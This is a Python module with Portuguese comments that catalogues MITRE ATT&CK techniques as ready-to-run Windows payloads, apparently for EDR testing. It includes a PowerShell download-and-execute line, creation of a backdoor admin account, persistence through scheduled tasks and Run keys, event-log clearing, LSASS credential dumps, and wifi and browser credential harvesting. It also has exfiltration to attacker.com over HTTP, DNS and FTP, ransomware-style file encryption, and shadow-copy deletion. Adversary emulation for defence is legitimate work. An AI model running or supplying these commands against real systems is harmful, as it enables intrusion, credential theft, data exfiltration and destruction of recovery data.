"""
Banco de Dados de Ataques baseado no MITRE ATT&CK Framework

Nota: Para uma biblioteca mais completa, considere usar:
- mitreattack-python: pip install mitreattack-python
- pyattck: pip install pyattck

Este módulo fornece ataques comuns pré-configurados para testes EDR.
"""

class AttackDatabase:
    """Banco de dados de ataques MITRE ATT&CK para testes"""
    
    def __init__(self):
        self.attacks = self._initialize_attack_database()
    
    def _initialize_attack_database(self):
        """Inicializa o banco com ataques comuns do MITRE ATT&CK"""
        return {
            # ========== EXECUTION (TA0002) ==========
            "T1059.001": {
                "ttp_id": "T1059.001",
                "ttp_name": "PowerShell Execution",
                "tactic": "Execution",
                "description": "Execução de comandos via PowerShell",
                "severity": "HIGH",
                "expected_damage": 25,
                "detection_difficulty": "MEDIUM",
                "payloads": {
                    "basic": 'powershell.exe -Command "Write-Host \'T1059.001 Attack\'; Get-Process"',
                    "encoded": 'powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAVAAxADAANQA5AC4AMAAwADEAIABBAHQAdABhAGMAawAnAA==',
                    "download_execute": 'powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.site/payload.ps1\')"'
                },
                "validation_checks": [
                    'Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-PowerShell/Operational"; ID=4104}',
                    'Get-Process | Where-Object {$_.ProcessName -eq "powershell"}'
                ]
            },
            
            "T1059.003": {
                "ttp_id": "T1059.003",
                "ttp_name": "Windows Command Shell",
                "tactic": "Execution",
                "description": "Execução de comandos via cmd.exe",
                "severity": "MEDIUM",
                "expected_damage": 15,
                "detection_difficulty": "LOW",
                "payloads": {
                    "basic": 'cmd.exe /c "echo T1059.003 Attack && whoami"',
                    "net_commands": 'cmd.exe /c "net user attacker Password123! /add && net localgroup administrators attacker /add"',
                    "scheduled_task": 'cmd.exe /c "schtasks /create /tn MaliciousTask /tr C:\\Windows\\Temp\\malware.exe /sc minute /mo 1"'
                },
                "validation_checks": [
                    'Get-LocalUser -Name "attacker"',
                    'Get-ScheduledTask -TaskName "MaliciousTask"'
                ]
            },
            
            # ========== DEFENSE EVASION (TA0005) ==========
            "T1027": {
                "ttp_id": "T1027",
                "ttp_name": "Obfuscated Files or Information",
                "tactic": "Defense Evasion",
                "description": "Ofuscação de código para evitar detecção",
                "severity": "HIGH",
                "expected_damage": 10,
                "detection_difficulty": "HIGH",
                "payloads": {
                    "base64_encoded": 'powershell.exe -EncodedCommand JABhAD0AJwBNAGEAbABpAGMAaQBvAHUAcwAgAEMAbwBkAGUAJwA7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACQAYQA=',
                    "string_concat": 'powershell.exe -Command "$a=\'Mal\'+\'icious\'; Write-Host $a"',
                    "xor_decode": 'powershell.exe -Command "$enc=@(77,97,108); $dec=$enc|%{[char]($_ -bxor 13)}; $dec -join \'\'"'
                },
                "validation_checks": [
                    'Get-Content C:\\Temp\\obfuscated.txt',
                    'Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4688}'
                ]
            },
            
            "T1055": {
                "ttp_id": "T1055",
                "ttp_name": "Process Injection",
                "tactic": "Defense Evasion",
                "description": "Injeção de código em processos legítimos",
                "severity": "CRITICAL",
                "expected_damage": 40,
                "detection_difficulty": "HIGH",
                "payloads": {
                    "reflective_dll": '''powershell.exe -Command "
                        $code = @'
                        [DllImport(\\"kernel32.dll\\")]
                        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
'@
                        Add-Type -MemberDefinition $code -Name 'Inject' -Namespace 'Win32'
                    "''',
                    "createremotethread": 'powershell.exe -Command "Start-Process notepad.exe; sleep 2; # Inject code here"'
                },
                "validation_checks": [
                    'Get-Process | Select-Object Name, Id, Handle',
                    'Get-WinEvent -FilterHashtable @{LogName="Security"; ID=10}'
                ]
            },
            
            "T1070.001": {
                "ttp_id": "T1070.001",
                "ttp_name": "Clear Windows Event Logs",
                "tactic": "Defense Evasion",
                "description": "Limpeza de logs do Windows para ocultar atividade",
                "severity": "HIGH",
                "expected_damage": 20,
                "detection_difficulty": "MEDIUM",
                "payloads": {
                    "clear_security": 'wevtutil.exe cl Security',
                    "clear_system": 'wevtutil.exe cl System',
                    "clear_application": 'wevtutil.exe cl Application',
                    "powershell_clear": 'powershell.exe -Command "Clear-EventLog -LogName Security,System,Application"'
                },
                "validation_checks": [
                    'Get-WinEvent -FilterHashtable @{LogName="Security"; ID=1102}',
                    'Get-EventLog -LogName Security -Newest 10'
                ]
            },
            
            # ========== PERSISTENCE (TA0003) ==========
            "T1547.001": {
                "ttp_id": "T1547.001",
                "ttp_name": "Registry Run Keys / Startup Folder",
                "tactic": "Persistence",
                "description": "Modificação de chaves de registro para persistência",
                "severity": "HIGH",
                "expected_damage": 30,
                "detection_difficulty": "LOW",
                "payloads": {
                    "run_key": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Malware /t REG_SZ /d "C:\\Temp\\malware.exe" /f',
                    "runonce_key": 'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Malware /t REG_SZ /d "C:\\Temp\\malware.exe" /f',
                    "startup_folder": 'copy C:\\Temp\\malware.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
                },
                "validation_checks": [
                    'Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
                    'Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'
                ]
            },
            
            "T1053.005": {
                "ttp_id": "T1053.005",
                "ttp_name": "Scheduled Task",
                "tactic": "Persistence",
                "description": "Criação de tarefas agendadas maliciosas",
                "severity": "MEDIUM",
                "expected_damage": 25,
                "detection_difficulty": "LOW",
                "payloads": {
                    "basic_task": 'schtasks /create /tn "Windows Update Check" /tr "C:\\Temp\\malware.exe" /sc daily /st 09:00',
                    "system_task": 'schtasks /create /tn "SystemMaintenance" /tr "powershell.exe -WindowStyle Hidden -File C:\\Temp\\backdoor.ps1" /sc onstart /ru SYSTEM',
                    "persistence_task": 'schtasks /create /tn "UserTask" /tr "cmd.exe /c start C:\\Temp\\payload.exe" /sc onlogon'
                },
                "validation_checks": [
                    'Get-ScheduledTask | Where-Object {$_.TaskName -like "*Update*"}',
                    'schtasks /query /fo LIST /v'
                ]
            },
            
            # ========== CREDENTIAL ACCESS (TA0006) ==========
            "T1003.001": {
                "ttp_id": "T1003.001",
                "ttp_name": "LSASS Memory Dump",
                "tactic": "Credential Access",
                "description": "Dump da memória do processo LSASS para roubo de credenciais",
                "severity": "CRITICAL",
                "expected_damage": 50,
                "detection_difficulty": "MEDIUM",
                "payloads": {
                    "procdump": 'procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp',
                    "comsvcs_dll": 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Temp\\lsass.dmp full',
                    "mimikatz_style": 'powershell.exe -Command "Invoke-Mimikatz -DumpCreds"'
                },
                "validation_checks": [
                    'Get-Process lsass | Select-Object Id, HandleCount',
                    'Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4656} | Where-Object {$_.Message -like "*lsass*"}'
                ]
            },
            
            "T1552.001": {
                "ttp_id": "T1552.001",
                "ttp_name": "Credentials in Files",
                "tactic": "Credential Access",
                "description": "Busca de credenciais em arquivos locais",
                "severity": "MEDIUM",
                "expected_damage": 20,
                "detection_difficulty": "LOW",
                "payloads": {
                    "search_passwords": 'powershell.exe -Command "Get-ChildItem -Path C:\\ -Include *password*,*cred*,*.config -Recurse -ErrorAction SilentlyContinue"',
                    "browser_creds": 'powershell.exe -Command "Get-ChildItem -Path \\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\" -Filter \\"Login Data\\""',
                    "wifi_passwords": 'netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {netsh wlan show profile $_.ToString().Split(":")[1].Trim() key=clear}'
                },
                "validation_checks": [
                    'Get-ChildItem -Path C:\\Temp -Filter "*password*"',
                    'netsh wlan show profiles'
                ]
            },
            
            # ========== LATERAL MOVEMENT (TA0008) ==========
            "T1021.001": {
                "ttp_id": "T1021.001",
                "ttp_name": "Remote Desktop Protocol",
                "tactic": "Lateral Movement",
                "description": "Uso de RDP para movimentação lateral",
                "severity": "HIGH",
                "expected_damage": 35,
                "detection_difficulty": "LOW",
                "payloads": {
                    "enable_rdp": 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
                    "firewall_rule": 'netsh advfirewall firewall add rule name="Allow RDP" protocol=TCP dir=in localport=3389 action=allow',
                    "rdp_connect": 'mstsc.exe /v:192.168.1.100 /admin'
                },
                "validation_checks": [
                    'Get-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" -Name fDenyTSConnections',
                    'Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*RDP*"}'
                ]
            },
            
            "T1021.006": {
                "ttp_id": "T1021.006",
                "ttp_name": "Windows Remote Management",
                "tactic": "Lateral Movement",
                "description": "Uso de WinRM para execução remota",
                "severity": "HIGH",
                "expected_damage": 30,
                "detection_difficulty": "MEDIUM",
                "payloads": {
                    "enable_winrm": 'winrm quickconfig -force',
                    "remote_command": 'powershell.exe -Command "Invoke-Command -ComputerName 192.168.1.100 -ScriptBlock {whoami}"',
                    "remote_script": 'powershell.exe -Command "Invoke-Command -ComputerName 192.168.1.100 -FilePath C:\\Temp\\script.ps1"'
                },
                "validation_checks": [
                    'Get-Service WinRM',
                    'Get-WSManInstance -ResourceURI winrm/config/listener -SelectorSet @{Address="*";Transport="http"}'
                ]
            },
            
            "T1047": {
                "ttp_id": "T1047",
                "ttp_name": "Windows Management Instrumentation",
                "tactic": "Execution",
                "description": "Execução remota via WMI",
                "severity": "HIGH",
                "expected_damage": 30,
                "detection_difficulty": "MEDIUM",
                "payloads": {
                    "remote_exec": 'wmic /node:"192.168.1.100" /user:"admin" /password:"pass" process call create "cmd.exe /c calc.exe"',
                    "query_remote": 'wmic /node:"192.168.1.100" process list brief',
                    "powershell_wmi": 'powershell.exe -Command "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \\"calc.exe\\" -ComputerName 192.168.1.100"'
                },
                "validation_checks": [
                    'Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -eq "calc.exe"}',
                    'Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-WMI-Activity/Operational"}'
                ]
            },
            
            # ========== COLLECTION (TA0009) ==========
            "T1560.001": {
                "ttp_id": "T1560.001",
                "ttp_name": "Archive via Utility",
                "tactic": "Collection",
                "description": "Compactação de dados para exfiltração",
                "severity": "MEDIUM",
                "expected_damage": 15,
                "detection_difficulty": "LOW",
                "payloads": {
                    "zip_compress": 'powershell.exe -Command "Compress-Archive -Path C:\\Users\\*.* -DestinationPath C:\\Temp\\data.zip"',
                    "rar_compress": 'rar.exe a -r C:\\Temp\\stolen.rar C:\\Users\\Documents\\*',
                    "7zip_compress": '7z.exe a C:\\Temp\\archive.7z C:\\Users\\*.docx -p"password"'
                },
                "validation_checks": [
                    'Get-ChildItem -Path C:\\Temp -Filter "*.zip"',
                    'Get-Process | Where-Object {$_.ProcessName -match "rar|7z"}'
                ]
            },
            
            # ========== EXFILTRATION (TA0010) ==========
            "T1041": {
                "ttp_id": "T1041",
                "ttp_name": "Exfiltration Over C2 Channel",
                "tactic": "Exfiltration",
                "description": "Exfiltração de dados via canal C2",
                "severity": "CRITICAL",
                "expected_damage": 45,
                "detection_difficulty": "MEDIUM",
                "payloads": {
                    "http_post": 'powershell.exe -Command "Invoke-WebRequest -Uri http://attacker.com/upload -Method POST -Body (Get-Content C:\\Temp\\data.txt)"',
                    "dns_exfil": 'powershell.exe -Command "$data=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content C:\\Temp\\secret.txt))); Resolve-DnsName \\"$data.attacker.com\\""',
                    "ftp_upload": 'powershell.exe -Command "$client = New-Object System.Net.WebClient; $client.Credentials = New-Object System.Net.NetworkCredential(\'user\',\'pass\'); $client.UploadFile(\'ftp://attacker.com/data.zip\', \'C:\\Temp\\data.zip\')"'
                },
                "validation_checks": [
                    'Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}',
                    'Get-DnsClientCache'
                ]
            },
            
            # ========== IMPACT (TA0040) ==========
            "T1486": {
                "ttp_id": "T1486",
                "ttp_name": "Data Encrypted for Impact",
                "tactic": "Impact",
                "description": "Criptografia de dados (Ransomware)",
                "severity": "CRITICAL",
                "expected_damage": 80,
                "detection_difficulty": "LOW",
                "payloads": {
                    "simulate_ransom": '''powershell.exe -Command "
                        Get-ChildItem -Path C:\\Temp\\*.txt | ForEach-Object {
                            $content = Get-Content $_.FullName
                            $encrypted = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
                            Set-Content -Path ($_.FullName + '.encrypted') -Value $encrypted
                            Remove-Item $_.FullName
                        }
                    "''',
                    "ransom_note": 'powershell.exe -Command "Set-Content -Path C:\\Users\\Public\\Desktop\\README_RANSOM.txt -Value \'Your files have been encrypted!\'"'
                },
                "validation_checks": [
                    'Get-ChildItem -Path C:\\Temp -Filter "*.encrypted"',
                    'Get-Content C:\\Users\\Public\\Desktop\\README_RANSOM.txt'
                ]
            },
            
            "T1490": {
                "ttp_id": "T1490",
                "ttp_name": "Inhibit System Recovery",
                "tactic": "Impact",
                "description": "Remoção de backups e pontos de restauração",
                "severity": "CRITICAL",
                "expected_damage": 70,
                "detection_difficulty": "LOW",
                "payloads": {
                    "delete_shadow": 'vssadmin.exe delete shadows /all /quiet',
                    "disable_recovery": 'bcdedit.exe /set {default} recoveryenabled no',
                    "delete_backup": 'wbadmin delete catalog -quiet',
                    "disable_restore": 'powershell.exe -Command "Disable-ComputerRestore -Drive \\"C:\\\""'
                },
                "validation_checks": [
                    'vssadmin list shadows',
                    'Get-ComputerRestorePoint'
                ]
            }
        }
    
    def get_attack(self, ttp_id):
        """Retorna detalhes de um ataque específico"""
        return self.attacks.get(ttp_id)
    
    def get_all_attacks(self):
        """Retorna lista de todos os ataques"""
        return list(self.attacks.values())
    
    def get_attacks_by_tactic(self, tactic):
        """Retorna ataques filtrados por tática MITRE"""
        return [
            attack for attack in self.attacks.values()
            if attack['tactic'].lower() == tactic.lower()
        ]
    
    def get_attacks_by_severity(self, severity):
        """Retorna ataques filtrados por severidade"""
        return [
            attack for attack in self.attacks.values()
            if attack['severity'] == severity.upper()
        ]
    
    def search_attacks(self, keyword):
        """Busca ataques por palavra-chave"""
        keyword_lower = keyword.lower()
        return [
            attack for attack in self.attacks.values()
            if keyword_lower in attack['ttp_name'].lower() or
               keyword_lower in attack['description'].lower()
        ]